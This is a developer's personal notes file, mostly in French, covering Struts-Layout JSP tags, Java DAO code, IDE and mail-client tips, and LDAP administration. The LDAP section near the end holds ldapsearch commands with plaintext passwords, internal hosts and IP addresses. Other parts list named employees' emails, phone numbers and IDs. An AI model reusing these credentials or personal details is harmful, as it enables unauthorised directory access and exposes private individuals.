exemple de champ select: (key cest le libelle en face du select ATTENTION IL EST OBLIGATOIRE BORDEL DE MERDE SINON CA PLANTE)
							<layout:select key="SYS_NOTHING" style="width:150px" multiple="true" size="10" layout="true" name="typeBesoinForm" property="typeBesoinOne.typeBesoinTwo">
							<layout:optionsCollection name="lotForm" property="grandDomaine" label="label" value="value"/>
							</layout:select>
<br/>
pour ecrire un message dynamique: 
				<% String stringBudget= I18NManager.get("ARCHIVE_3", lng); %>
				i18nService.getSession.get
				<bean:message key="FIG_CONFIRM2" arg0="<%=stringBudget%>" arg1="<%=dateBudget%>"  />
disabled
		attention disabled s'ecrit sans les guillemets apres: disabled = true sinon le request ne disable pas  par exemple dans un select. Si ca ne compile pas mettre des guillemets: disabled="true"
		en html c'est disabled="disabled"  mais ATTENTION: ne vas pas dans le request si on utilise disabled. Utiliser plutôt readonly="readonly"
Pour faire un formulaire tableau formulaire avec des beans imbriques getter renvoyant un bean qui lui meme a un getter:
										<layout:collection name="besoinForm" property="besoinOne.besointwo" offsetIndexId="index">
													<layout:collectionItem title="I18N_EXPIMP" property="libelle" sortable="true"/>
													<layout:collectionItem title="I18N_EXPIMP"> // peut etre ne pas mettre sortable. Et on est pas oblige de mettre property ici.  attention styleId je crois que ca devient l'id de mon champ html
																<layout:text property="besoinOne.besointwo[${index}].fournisseur" isRequired="false" key="I18N_EXPIMP" styleId="id" maxlength="5" size="5" layout="false"/>
																<layout:link href="#" onclick="javascript:window.open('ArcaPaged.do');" styleClass="RnoButton">
																			<html:img page="/../images/pictos/deleteicon_2.gif"/>(il faut peut etre entourer les images de layout:cell)
																		</layout:link>
											</layout:collectionItem>
										</layout:collection>
										AUTRE EXEMPLE:                                              attention styleId je crois que ca devient l'id de mon champ html
                    <layout:collection offsetIndexId="cle" oddId="true" styleId="pcpLst" name="PCPMainPageForm" property="records" id="element" styleClass2="COLLECTION_2"(optionel: pour faire joli: aspect zebre) width="640px" >
                        <layout:collectionItem title="SYS_NOTHING" >
                            <a href="javascript:document.PCPMainPageForm.submit();" id="save${cle}"><html:img module="auth" page="/images/save.png" /></a>
                            ou 
                            <a href="/TypeBesoinAction.do?reqCode=delete&id="${typebesoinBean.id}"><html:img module="auth" page="/images/delete.png" /></a>
                        </layout:collectionItem>
													// ci dessous idTrucmuche appelle le getter getIdTrucmuche() du bean "cle"
                        <layout:collectionInput title="JANUARY" formProperty="records[${cle}].idTrucmuche.charge.values[0]" size="4px" maxlength="5" onchange="modify(${cle})" />
                        <layout:collectionInput title="FEBRUARY" formProperty="records[${cle}].charge.values[1]" size="4px" maxlength="5" />
                        <layout:collectionInput title="MARCH" formProperty="records[${cle}].charge.values[2]" property="result" size="4px" maxlength="5" />
                         .....
    </layout:collection>

la definition du path vers les images se fait dans le fichier struts_layout_default.properties
pour faire des champs obligatoires ou non:  (key c'est le libelle en face du champ texte)
          			<layout:text key="00002" name="lotForm" property="SIA" isRequired="false" /> 
          			ou
          			<layout:text styleClass="RnoInstructionText" key="ATHF.SEASON" 	name="addEpisodeForm" property="season" isRequired="true" /> 
    		va generer ca:
            			<th valign="top" class="RnoInstructionText">
            				<span class="RnoInstructionText">Season<img name="seasonrequired" src="/fws/configstrutslayout/ast.gif"></span>
            			</th>
            			<td valign="top" class="RnoInstructionText" style="">
            				<input type="text" name="season" value="" onchange="checkValue(this, 'season','TEXT',true);" class="RnoInstructionText">
            			</td>
        	         mettre l'option layout="false" si on ne veut pas que il genere des td, th et tr par lui même (si il ya des retours à la ligne à la con de merde)
      sinon pour mettre le petit asterix image obligatoire avant un select: 
                <layout:column style="text-align: right;">
                				<layout:grid>
                						<layout:cell>
                							<html:img contextRelative="true" page="/images/isRequired.gif" />
                						</layout:cell>
                					<layout:select style="text-align: right;" name="ListElementForm" property="department" key="SCR03_DEPARTMENT"	styleClass="RnoInstructionText" onchange="javascript:document.forms[0].action='/gea/auth/ListElement.do?reqCode=department';document.forms[0].submit();">
                						<layout:optionsCollection name="ListElementForm"
                							property="listDepartment" value="idDepartment" label="name" />
                					</layout:select>
                					<layout:select style="text-align: right;" name="ListElementForm" property="department" key="SCR03_DEPARTMENT"	styleClass="RnoInstructionText" onchange="changeAcknowlegement(this, '${element.acknowledgement}','hehe le parametre precedent marche bien gnarkgnark');">
                						<layout:optionsCollection name="ListElementForm"
                							property="listDepartment" value="idDepartment" label="name" />
                					</layout:select>
                					
                					</layout:grid>
                        ....
pour definir des droits à des formulaires:
			Dans l'action contenant un request et un form:
			import fr.improve.struts.taglib.layout.util.FormUtils;
			...
			FormUtils.setFormDisplayMode(request, form, FormUtils.EDIT_MODE); (il y a aussi setFieldDisplayMode pour un ciblage sur le champs)
			Dans la jsp:
			EDIT (E)
			INSPECT (I)
			HIDDEN (H)
			NODISPLAY (N)
			INSPECT_ONLY (S)
			INSPECT_PRESENT (P)
			DISABLED (D)
			READONLY (R)
			le mode est note dans l'ordre : CREATE, EDIT, INSPECT
			EXEMPLE
			<layout:text key="blabla" property="blabal" mode="E(editable en mode CREATE_MODE),I(inspectable en mode EDIT_MODE),I(inspecatble en mode INSPECT_MODE)"/>
Pour faire deux swaping lists: (ou switching lists)
			Ne pas utiliser layout:swap: c'est une vraie merde.
			dans jsp:
									<script>
						      function swap(listFrom, listTo)
						      {
						        
						            addOptionsSelectedToListTo(listFrom, listTo);
									removeOptionSelected(listFrom);
						        
						      }
						      
						      function addOptionsSelectedToListTo(listFrom, listTo)
						      {
									  var i;
									  for (i = listFrom.length - 1; i>=0; i--) 
									  {
										   if (listFrom.options[i].selected) {
											listTo.options[listTo.options.length]=new Option(listFrom.options[i].innerHTML,listFrom.options[i].value);
										 }
									  }
							  }
							  
							function removeOptionSelected(elSel)
							{
									  var i;
									  for (i = elSel.length - 1; i>=0; i--) 
									  {
										   if (elSel.options[i].selected) {
										      elSel.remove(i);
										      // pas besoin de mettre store.commitChanges();
										 }
									  }
							}	
							</script>			
							<layout:select key="00002" style="width:150px" multiple="true" size="10" layout="true" name="tabForm" property="strCriteres">
									<layout:optionsCollection name="tabForm" property="criteres" label="label" value="value"/>
							</layout:select>
							<layout:button onclick="swap(document.getElementsByName('strCriteres')[0], document.getElementsByName('tab.strCriteres')[0]);"> <bean:message key="SYS_SEARCH" /></layout:button>						
							<layout:button onclick="swap(document.getElementsByName('tab.strCriteres')[0],document.getElementsByName('strCriteres')[0]);"> <bean:message key="SYS_SEARCH" /></layout:button>						
              <layout:select key="00002" style="width:150px" multiple="true" size="10" layout="true" name="tabForm" property="tab.strCriteres">
									<layout:optionsCollection name="tabForm" property="tab.criteres" label="label" value="value"/>
							</layout:select>	
pour permettre le tri d'une collection cote client dans la jsp:
<layout:collection name="list" styleClass="COLLECTION_1"  styleClass2="COLLECTION_2"(optionel: pour faire joli: aspect zebre) sortAction="client" (optionel: pour faire un tri javascript)>
	<layout:collectionItem sortable="true" title="person.firstname" property="firstname"/>
	<layout:...
	quand on clique sur le bouton trier il va executer une action a lui et va reexecuter la derniere action effectuee. Donc bien s'assurer que dans cette derniere action on ne va pas annuler son travail en resettant la liste. Pour ce faire, dans l'action faire: 
	if (request.getParameter("LayoutCollection")==null) setter la liste. Else non
pour faire des liens dans un tableau (une liste):
				         <layout:collection property="records" name="i18nUploadDownloadForm" id="fileBean">
				           <layout:collectionItem title="FILE_NAME" property="name" sortable="true">
				           <layout:collectionItem title="FILE_NAME(recupere dans applicationressource)" property="name"(getName de mon fileBean) sortable="true">
									<layout:link layout="false" action="/i18n/I18NUploadDownloadDownload.do?reqCode=download" paramId="fileBeanName"(je rajoute a mon lien ?fileBeanName=) paramName="fileBean" paramProperty="name"(paramNam et paramProperty: fileBean.getName())>
									ou (si on appelle action struts)
                  <layout:link layout="false" action="/TypeBesoinAction.do?reqCode=delete&id=${typebesoinBean.id}">
									<layout:write name="fileBean" property="name"/>
									</layout:link>
				           </layout:collectionItem>
				          ou (si on appelle url)
         					<layout:collectionItem title="SCR03_IDENTIFICATION" property="identification" target="_blank" href="${validation.link}/${validation.elementVersion.fileName}" sortable="true" />
pour faire un lien dans struts avec window.open: (popup)
									<a onclick="window.open('<html:rewrite action="FileManager"/>?reqCode=download&amp;fileBeanName=${fileBean.name}')">${fileBean.name}</a>
pour faire des entetes de tableau avec des titres dynamiques: 
				layout:collectionItem title va chercher dans le message ressource le titre des entetes de tableau. si on veut rendre ce titre dynamique:
				 <layout:collectionItem arg0="blah" title="FILE_NAME" property="name" sortable="true">
				 et dans message ressource mettre FILE_NAME=titre de mon entete {0}
				 il ecrira: "titre de mon entete blah"
				 je peux rendre arg0 dynamique aussi: <layout:collectionItem arg0=${bean} title="FILE_NAME" property="name" sortable="true">
Si un layout:collectionItem n'ecrit rien
		mettre entre ces balises une balise layout:write

fop :
		pour generer un pdf avoir telecharge fop et dedans mettre un fichier xml(donnees.xml) , un fichier xsl avec des balises fop(fichierfo.fo) et en cmd executer ca:
		fop -xml donnees.xml -xsl fichierfo.fo   -pdf sortie.pdf (ca appelle fop.bat)



BLOBS : 
La manipulation simplifiee des blob fonctionne egalement avec ORACLE et 
le driver ojdbc14_9208.jar.
Il devient donc très facile de gerer des blob via l'AbstractDataBean, un 
simple paramètre InputStream ou byte[] suffit.
Si tu penses que l'option filesystem est trop penalisante pour ton 
projet, je t'envoie le nouveau source AbtractDataBean.
La fonction à  utiliser pour les mises à  jour est 
executeBlobUpdateJDBCV3(String query, int length, Object[] parameters). 
Elle exige la longueur en octet des donnees BLOB.
Elle fonctionne aussi bien pour des insertions que pour des 
modifications. Je la trouve très confortable et surtout performante.
La methode de lecture reste la même.
Il te suffit de substituer fws.jar dans le repertoire lib.
fws.jar en question est dans un mail que m'a envoye JeanMichelSOULAT le 28 aout 2007


 

WSAP toujours cocher dans preferences: fenetres > preferences : J2EE: activer la prise en charge du ciblage de serveur

thunderbird :
  pour marquer certains mails:
      comme personnel, important, a faire etc etc : tapper 1, 2, 3 etc... sur le pave numerique   
recuperer thunderbird sur le net
pour parametrer thunderbird pour qu'il aille chercher dans annuaire renault les destinataires:
https://collaboration.renault.com/eRoom/FAC_KORP1_10/RS3Minute/0_5ee94
si je change de poste, tous les parametres thunderbird à recuperer sont sur : C:\Documents and Settings\Administrator\Application Data\Thunderbird
les fichiers (recuperer de l'espace) volumineux de thunderbird sont sous: C:\Documents and Settings\Administrator\Application Data\Thunderbird\Profiles\wdrzyxzf.default\Mail\Local Folders
Creer une signature avec texte et image: 
    creer une signature juste avec l'image
    s'envoyer un mail avec cette signature
    repondre au mail et ecrire avec sa signature en html en gardant l'image
    enregistre sous ... en .html
    reparmetrer la nouvelle signature cette fois non pas avec image mais avec fichier html et prendre le fichier html cree


pour me connecter à  mon lecteur reseau: \\f-mehen\home5$\p036782
pour se connecter : http://proxypac.renault.fr/proxy.cgi

CVS :
sur CVS: 'reserver en tant que projet' c'est comme checkin.(recuperation en local à  partir du repository)
_____________________
Une petite precision à  propos des travaux Atos de TQC:
1Â°) Quelques definitions
Il existe plusieurs categories de TQC
TQC Ordinaire
-> Travaux de maintien des applis à  un niveau correct de fonctionnement: Analyse de dysfonctionnements, Correctifs, Gestion de la vie serie des applis, Inventaire du parc.
TQC Technique
-> Migrations (suivi des versions de produit)  WAS, Oracle,...
-> Migrations de plateforme: WAS->Websphere-CE, Oracle->MySql,..
-> Maintenance Preventive: Fiabilisation de code (amelioration hors incident, visant à  reduire le TQC futur).
TQC Hors forfait
-> Reversibilite de BO (Transfert d'appli d'un BO non Atos vers un BO Atos
-> Reversibilite de FO (Transfert d'appli (d'un FO) vers Minute
2Â°)Mode financement
Le TQC Technique est gere de faà§on particulière cà´te Atos. De ca fait, lorsque des ressources Atos (ou sous-traitants Atos) travaillent sur de tels sujets, Nathalie doit en être prevue afin de "demander du budget".
Nous vous demandons donc d'en informer Natahlie explicitement!
 Pour info, le TQC hors forfait est paye explicitement.
________________________
Pour demander d'ajouter des ADA secondaires sur l'annuaire ARCA de prod (qui est aussi utilise en re7), il faut ecrire à  cca.applications@renault.com.
Pour l'ARCA de dev, il faut en revanche contacter DT/GE.

Si pb envir WAS, PHP en Integration et Dev: contact: JF PERIN.  p024194  +33 1 76841697 et Doss-Fettah Bennani doss-fettah.bennani-renexter@renault.com +33 1 768 30774 p040267
Si pb Recette: indus "Eric-atisso KOUMEDZRO eric.koumedzro-renexter@renault.com, Thomas LORENTZ thomas.lorentz@renault.com. En toute logique vous n'avez pas besoin de lui parler

 
WSAD : (was4)
si le projet n'a pas le bon jre: fenetre> preferences > JREinstalles: choisir le bon puis dans projet > propriete > ajouter une bibliotheque
si probleme: le serveur se lance mais sur le browser quand on saisi l'adresse de l'appli rien ne se passe:
wsad:propriete du projetweb-> changer le context root en enlevant "web" + regenerer le module appl.xml: supprimer puis re add du/des modules + redeployer l'application entreprise sur le serveur.
si on ne voit pas les images ni css ni js: dans web.xml cocher "activation de la prise en charge des fichiers": ca equivaut à  modifier ibm-web-ext.xmi : fileServingEnabled="true". De plus s'assurer que dans le projet sia(application d'entreprise) la securite est standardisees c a d qu'il y a bien un fichier ibm-application-bnd.xmi à  cote du fichier application.xml et que ce fichier est correctement rempli
si la page se recharge sans arret comme une folle : comparer web.xml avec application.xml : c'est du à  un problème des roles qui ne figurent pas correctement dans ces deux fichiers
Ctr + Shift + O ajouter automatiquement les imports manquants à  une classe
Ctr + Shift + R refractor: atteindre une classe
click droit sources: generer getter et setters
alt + flechegauche pour revenir en arriere
Pour RC9 notemmment si il ya une erreur parce que un fichier xml ne peut pas etre valide ou un truc comme ca parce qu'il essaye d'aller sur internet
faire: fenetre>preferences>Internet: parametrer le proxy
si il ca ne compile pas parce que il manque des librairies type J2SE JSE: les chercher dans les jars externes jce.jar (jre 1.4 et supperieur)
si on a un message de typ: CWPMI0023W: Impossible d'enregistrer le module PMI à  cause d'un nom en double : /ptl/jsp/footer.jsp
	
struts manuel de reference :
http://struts.apache.org/1.x/struts-taglib/tagreference.html
http://struts.apache.org/1.x/struts-core/dtddoc/struts-config_1_3.dtd.html
 
fws :  IRN=7720
pour changer le titre d'une jsp: 
			<script type="text/javascript">
						document.getElementById("TitreMenu").innerHTML='<bean:message key="TypeBSCR004-1MAJ" />><bean:message key="TypeBSCR004-1CR" /> <div id="TitreMenu" class="H2Separator"></div>';
				</script>
exemple de dao:
													package renault.rad.struts.querymanager.jdbc.dao;
													/**
													 * Insert the type's description here. Creation date: (23/06/00 15:50:57)
													 * 
													 * @author: Administrator
													 */
													public class QueryDAO extends AbstractDataBean implements Serializable {
														private static final String FINDBYNAME ="SELECT ...";
													
														private static final String UPDATEQUERYMYSQL =...
													
														/**
														 * Insert the method's description here. Creation date: (23/06/00 16:05:55)
														 */
														public QueryDAO() {
															setFormatDate(false);
														}
														/**
														 * Insert the method's description here. Creation date: (12/11/00 18:53:36)
														 * 
														 * @return java.util.Vector
														 * @param name
														 *            java.lang.String
														 * @param connection
														 *            java.sql.Connection
														 * @exception java.sql.SQLException
														 *                The exception description.
														 */
														public java.util.List findAllByNameAndDate(
															QueryPageSqlCommand cmd,
															int maxSize,
															Connection connection)
															throws Exception {
															Vector rows = null;
															try {
																GregorianCalendar gregorianCalendar = new GregorianCalendar();
																gregorianCalendar.setTime(cmd.getDateTo());
																gregorianCalendar.set(                             // conserve year month date du calendrie gregorian actuel mais remet à zero les heurs minutes et secondes.
																	gregorianCalendar.get(GregorianCalendar.YEAR),
																	gregorianCalendar.get(GregorianCalendar.MONTH),
																	gregorianCalendar.get(GregorianCalendar.DAY_OF_MONTH),
																	0,
																	0,
																	0);
																gregorianCalendar.add(GregorianCalendar.DATE, 1); // rajoute un jour
																Object[] parameters =
																	{ cmd.getId(), cmd.getDateFrom(), gregorianCalendar.getTime()};
																setConnection(connection);
																switch (getDatabaseType(connection)) { voir LINKswcthfdf
																	case QueryDAO.TYPE_ORACLE:
																		rows =
																			getRowsFromPreparedStatement(
																				PAGEBYNAMEANDDATE,
																				parameters,
																				maxSize);
																		break;
																	case QueryDAO.TYPE_MYSQL:
																		rows =
																			getRowsFromPreparedStatement(
																				PAGEBYNAMEANDDATEMYSQL,
																				parameters,
																				maxSize);
																		break;
																}
															} catch (Exception e) {
																throw e;
															}
															if (rows.size() == 0)
																return null;
															java.util.List queryInfos = new java.util.ArrayList();
															for (Enumeration e = rows.elements(); e.hasMoreElements();) {
																Hashtable ht = (Hashtable) e.nextElement();
																queryInfos.add(
																	new QueryInfos(
																		(String) ht.get("QUERYID"),
																		(String) ht.get("QUERYDESC"),
																		(String) ht.get("QUERYCODE"),
																		(String) ht.get("QUERYDTCREATED"),
																		(String) ht.get("QUERYDTMODIFIED"),
																		(String) ht.get("QUERYPARAMA"),
																		(String) ht.get("QUERYPARAMB"),
																		(String) ht.get("QUERYPARAMC")));
															}
															return queryInfos;
														}
														private int getDatabaseType(Connection connection) throws Exception {
															try {
																String database =
																	connection.getMetaData().getDatabaseProductName().toLowerCase();
																if (database.indexOf("oracle") > -1) {
																	return QueryDAO.TYPE_ORACLE;
																} else if (database.indexOf("mysql") > -1) {
																	return QueryDAO.TYPE_MYSQL;
																} else {
																	throw new Exception("Unsupported database "+database);
																}
															} catch (SQLException e) {
																throw new Exception(e.getMessage());
															}
														}
														public String getError() {
															return super.getError();
														}
													}
														/**
                          	 * Return a Vector representing the records from a query string
                          	 * @param String The query string to perform
                          	 * @param Object[] A table of objects containing the values of PreparedStatement parameters
                          	 * in the good order.
                          	 * @param int  The maximum number of records to be fetched
                          	 */
                          	public final Vector getRowsFromPreparedStatement(String query,Object[] parameters,int maxSize)throws Exception {
                          		try {
                          			return (Vector) executeFromQuery(pameters,query,maxSize,false,false,null);
                          		} catch (SQLException e) {(...)
                          		private Object executeFromQuery(Object[] parameters,String query,int maxSize,	boolean isForUpdate,boolean isForBlobUpdate,InputStream is)	throws Exception {
                            		Connection cnx = null;
                            		PreparedStatement preparedStatement = null;
                            		ResultSet resultSet = null;
                            		try {
                            			if (query != null) {
                            				cnx = getConnection();
                            				//Mandatory for updating Blob because we have to use FOR UPDATE query
                            				if (isForBlobUpdate) {
                            					if (!query.endsWith(" FOR UPDATE")) {
                            						query += " FOR UPDATE";
                            					}
                            				}
                            				preparedStatement = cnx.prepareStatement(query);
                            				if (parameters != null) {
                            					setParameters(preparedStatement, parameters);
                            				}
                            				if (isForUpdate) {
                            					return new Integer(preparedStatement.executeUpdate());
                            				} else {
                            					//Mandatory for updating Blob because we have to use FOR UPDATE query					
                            					if (isForBlobUpdate) {
                            						cnx.setAutoCommit(false);
                            						resultSet = preparedStatement.executeQuery();
                            						execUpdateBlobQuery(resultSet, is);
                            						cnx.commit();
                            						cnx.setAutoCommit(true);
                            					} else {
                            						resultSet = preparedStatement.executeQuery();
                            						return resultSetToVectorHashtable(resultSet, maxSize);
                            					}
                            				}
                            			}
                            		} catch (SQLException e) {
                            			setError(e.getMessage());
                            			throw e;
                            		} catch (Exception e) {
                            			throw e;
                            		} finally {
                            			try {
                            				if (resultSet != null) {
                            					resultSet.close();
                            				}
                            			} catch (Exception e) {
                            				throw e;
                            			} finally {
                            				try {
                            					if (preparedStatement != null) {
                            						preparedStatement.close();
                            					}
                            				} catch (Exception e) {
                            					throw e;
                            				} finally {
                            					try {
                            						if (cnx != null) {
                            							if (isSelfConnection()) {
                            								cnx.close();
                            							}
                            						}
                            					} catch (Exception e) {
                            						throw e;
                            					}
                            				}
                            			}
                            		}
                            		return null;
                            	}
                              	private void setParameters(
                              		PreparedStatement preparedStatement,
                              		Object[] parameters)
                              		throws Exception {
                              		for (int i = 0; i < parameters.length; i++) {
                              			if (parameters[i] == null) {
                              				preparedStatement.setNull(i + 1, Types.NULL);
                              			} else if (parameters[i] instanceof String) {
                              				preparedStatement.setString(i + 1, (String) parameters[i]);
                              			} else if (parameters[i] instanceof Integer) {
                              				preparedStatement.setInt(
                              					i + 1,
                              					((Integer) parameters[i]).intValue());
                              			} else if (parameters[i] instanceof Double) {
                              				preparedStatement.setDouble(
                              					i + 1,
                              					((Double) parameters[i]).doubleValue());
                              			} else if (parameters[i] instanceof InputStream) {
                              				preparedStatement.setBinaryStream(
                              					i + 1,
                              					(InputStream) parameters[i],
                              					getInputStreamLength());
                              			} else if (parameters[i] instanceof byte[]) {
                              				preparedStatement.setBytes(i + 1, (byte[]) parameters[i]);
                              			} else if (parameters[i] instanceof Date) {
                              				preparedStatement.setDate(
                              					i + 1,
                              					new java.sql.Date(((Date) parameters[i]).getTime()));
                                        // convertir un java.sql.Date en java.util.Date: 
                                        java.util.Date datecreationjdk = new java.util.Date(datecreation.getTime()); 
                              			}
                              		}
                              	}

exemple de commande: 
										package renault.ple.commands;
										import java.io.PrintWriter;
										import java.io.StringWriter;
										import renault.rad.struts.querymanager.jdbc.dao.QueryDAO;
										import com.renault.struts.command.CommandException;
										import com.renault.struts.command.SqlCommand;
										public class ImportTypeCommand extends SqlCommand{
											public String type = "";
											public String action = "";
												@Override
												public boolean isReadyToCallExecute() {
													return true;
												}
											private void getImportType() throws Exception
											{
												ImportDAO importDao = new ImportDAO();
												this.type=importDao.execSearchQuery(connection);
											}
												@Override
												public void performExecute() throws CommandException {
													try
													{
														if (action.equals("getImportType")) getImportType();
														else if (action.equals("getDomaines")) getImportType();
														else getImportType();
													}
													catch (Exception e)
													{
														StringWriter sw = new StringWriter();
												        PrintWriter pw = new PrintWriter(sw, true);
												        e.printStackTrace(pw);
												        pw.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
												        sw.flush();
												        log.error(sw.toString());
														throw new CommandException(e);
													}
												}
												@Override
												public void reset() {
													// TODO Raccord de methode auto-genere
												}
											}

pour utiliser les classes command dans un batch :
	/** 
	 * This allow the use of the command layer within the Framework (FWS)
	 */
	public static void loadCommandPlugin () throws Exception {
		InputStream is = MaClasse.class.getClassLoader().
		 getResourceAsStream ("nom de mon fichier command.xml"); 
     verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); 
     System.out.println("ClassLoader resource path: " + HRParameters.class.[getClassLoader()].getResource("hr-openhr-for-ta.properties")); // pour recuperer le path d'un fichier de properties propriete dans les resources []depuis java9 marche plus LINKgetRes9 
     System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
		CommandApplication application = new CommandApplication(); // appartien a fws.jar
		application.load(is);
	}

si on a l'erreur 
es.renault.util.i18n.I18NException: es.renault.util.i18n.I18NException: es.renault.util.i18n.I18NException: java.sql.SQLException: ORA-00942: Table ou vue inexistante 
sur le navigateur, cela decoule d'une erreur dans I18NBasicAdaptater qui pause un problème dans la methode "LoadProperties()" au lancement du serveur: 
cette erreur peut etre due au fait que le champ des libelles est à nul sur au moins une ligne de la table des libelles.

Effacer expres
LDAP :
  si erreur org.springframework.dao.IncorrectResultSizeDataAccessException: base: 'dc=ALINEA-1,dc=fr'; filter: '(&(objectclass=user)(pager=ALIS007105))'.
          Cela signifie que le filtre de recherche ldap 'dc=ALINEA-1,dc=fr'; filter: '(&(objectclass=user)(pager~=ALIS007105))' //~ c'est pour ignorer la casse casse insensitive
          heu... a completer. j'ai efface l'explication
          attention si on met a jour le ldap il se peut qu'il faille attendre avant propagation pour que ça refonctionne
    pour naviguer utiliser Ldapbrowser: ( on peut aussi utiliser ApacheDirectoryStudio-win32-1.1.0.v20080331.exe ou ldapAdmin(.exe simple)
            syntaxe pour filtrer sur ldap browser 
                le coscenter aa00798 avec un renaccountsuspended egal a rien 
                  (&(rencostcenter=aa00798)(!(renaccountsuspended~=*))) //~ facultatif c'est pour ignorer la casse casse insensitive
                un user: 
                    searchbase: ou=People,o=renault
                    filter: (uid=awtb2e4)
                pour chercher les droits d'un user sur une appli: 
                      o=renault ou=Rights  ou=FRA ou=Application -trouver mon appli et là chercher uniqueMember
    en cas de ldap.SizeLimitExeededException
                                    Solution 1: augmenter la taille du sizemax.
                                    Ca se fait dans les fichiers /etc/openldap/slapd.conf et/ou /etc/openldap-self/slapd-self.conf 
                                    selon le serveur LDAP sur lequel on veut faire des requettes qui ramenent plus de data. 
                                    je n'ai pas creuse la question du la taille max que le serveur peut supporter.
                                    Si c'est la solution à mettre en place alors dans la classe UserService il faut utiliser la methode getLdapQueryCallbackResult au lieu de getLdapQueryPagingResult
                                    Solution 2 : permettre la pagination.
                                    Ce qui a ete fait pour permettre la pagination :
                                    A - Dans le fichier UserServiceLdap-context.xml il faut utiliser un SingleContextSource: du coup la connexion LDAP ne se ferme jamais. Nous devons donc tester cela en environnement de recette! Mais c'est le seul moyen pour que la pagination fonctionne;
                                            <bean id="context" factory-bean="contextSourceAgentWrite" factory-method="getReadWriteContext" />
                                            <bean id="singlecontextSourceAgentWrite" class="org.springframework.ldap.core.support.SingleContextSource">
                                               <constructor-arg ref="context" />
                                            </bean>
                                        <bean id="ldapTemplateAgentWrite" class="org.springframework.ldap.core.LdapTemplate">
                                            <!-- avant: <constructor-arg ref="contextSourceAgentWrite" /> -->
                                            <constructor-arg ref="singlecontextSourceAgentWrite" /> 
                                        </bean>    
                                    B - Dans UserService.java les deux methodes sont dispo : 
                                                users = getLdapQueryPagingResult(ldapFilter.encode(), "cn"); // paging method AF recuperer au CISIRH
                                            //  users = getLdapQueryCallbackResult(ldapFilter.encode(), "cn"); // callback returns only the first elements without crashing when maxsize is reached AF recuperer    
                                    C - Pour que la "paging method" fonctionne j'ai du aussi overrider la classe PagedResultsDirContextProcessor. J'ai appele la nouvelle classe CustomPagedResultsDirContextProcessor AF recuperer
    
                                                            duplusprecis---->>>>>au plushaut
    erreurs :[LDAP: error code 49 - 80090308: LdapErr: DSID-0C090334, comment: AcceptSecurityContext error, data 52e, vece]; nested exception is javax.naming.AuthenticationException: [LDAP: error code 49 - 80090308: LdapErr: DSID-0C090334, comment: AcceptSecurityContext error, data 52e, vece]
      regarder quel est le code entre data et vxxx : 
          525	user not found
          52e	invalid credentials (le compte admin utilise est faux ou bien le user(cpt admin) existe mais mdp est faux)
          530	not permitted to logon at this time
          531	not permitted to logon at this workstation
          532	password expired
          533 account disabled
          534	account disabled 
          The user has not been granted the requested logon type at this machine
          701	account expired
          773	user must reset password
          775	user account locked 
           

 dev: anndev.sax.renault.fr 389 baseDN: o=renault userDN: uid=AWTWSAD,ou=FRA,ou=People,o=renault
    Nommage dns 
openldap :
    connaitre la version de openldap : 
            >>>	slapd -VV
         	demarrer service ldap:
            >>>	service slapd start
            >>>	service slapd stop
            >>> service slapd restart
            conf sous /etc/openldap/slapd.conf
            	  /etc/openldap-self/slapd-self.conf
            verifier config :
            >>>	slaptest -f pathJusquauFichierConf
            	exemple:
            >>>	slaptest -f /etc/openldap-self/slapd-self.conf
            verifier si serveur ldap tourne:
            	ps -ef | grep slapd
    				Redemarrer les serveurs ldap: 
            	>>>			kill -INT cat /exploit/ldap/openldap-self/slapd.pid
            	>>>			/usr/sbin/slapd -h ldap://172.26.129.36:10389/ -u ldap -l local3 -f /etc/openldap/slapd.conf
            	>>>			slapd -h ldap://172.26.129.36:10390/ -u ldap -l local3 -f /etc/openldap-self/slapd-self.conf
            	>>>			slapd -h ldap://172.26.129.36:10389/ -u ldap -l local3 -f /etc/openldap/slapd.conf
            faire des recherches:
            OK:	java -jar ldaptest-1.0.jar 3 ldap://ldap:389 cn=svc-hraccess,ou=Services,ou=Accounts,dc=insitu,dc=ad,dc=exane,dc=com 'p@hhWbQTl6!jiqwQ' dc=insitu,dc=ad,dc=exane,dc=com '(&(objectclass=person)(msRTCSIP-UserEnabled=TRUE)(sAMAccountName~=KER_A)(employeeID=*))' 
            OK: ldapsearch -D 'cn=svc-hraccess,ou=Services,ou=Accounts,dc=insitu,dc=ad,dc=exane,dc=com' -H "ldap://ldap:389" -W -x -b "dc=insitu,dc=ad,dc=exane,dc=com" '(&(objectclass=person)(msRTCSIP-UserEnabled=TRUE)(sAMAccountName~=KER_A)(employeeID=*))' //Le mot de passe est demande à l’utilisateur dans un second temps
            >>> ldapsearch -D "cn=hruser,ou=Management,o=onp" -h 172.26.129.36 -p 10389 -w hrsecret -x -b "ou=people, o=onp" 	
            >>> ldapsearch -D "cn=hruser,ou=Management,o=onp" -h 172.26.129.36 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" 	
            >>> ldapsearch -D "cn=hruser,ou=Management,o=onp" -h 172.26.129.36 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" '(&(objectclass=person)(x-osirh-Partenaire=MTS)(!(employeeType~=ADMINISTRATEUR)))' //~ facultatif c'est pour ignorer la casse	casse insensitive
            >>> ldapsearch -D "cn=hruser,ou=Management,o=onp" -h 172.26.129.36 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" '(!(employeeType=ADMINISTRATEUR))'	
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h 172.26.129.36 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" '(&(objectclass=person)(!(employeeType=ADMINISTRATEUR)))'	
            ldapsearch -D "cn=Manager, o=onp" -h sac-as01 -p 10389 -w secret -x -b "ou=people, o=onp" "uid=*"
            ldapsearch -D "cn=Manager, o=onp" -h sac-as01 -p 10389 -w secret -x -b "ou=people, o=onp" "x-osirh-CertificateFingerPrint=1a2581facaa60cba1b12c7a0460cb6416394b29f"
            ldapsearch -D "cn=Manager, o=onp" -h sac-as01 -p 10389 -w secret -x -b "ou=people, o=onp" "employeeNumber=ADMMCC000000001"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10389 -w hrsecret-x -b "ou=people, o=onp" "uid=*"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10389 -w hrsecret -x -b "ou=people, o=onp" "uid=*"
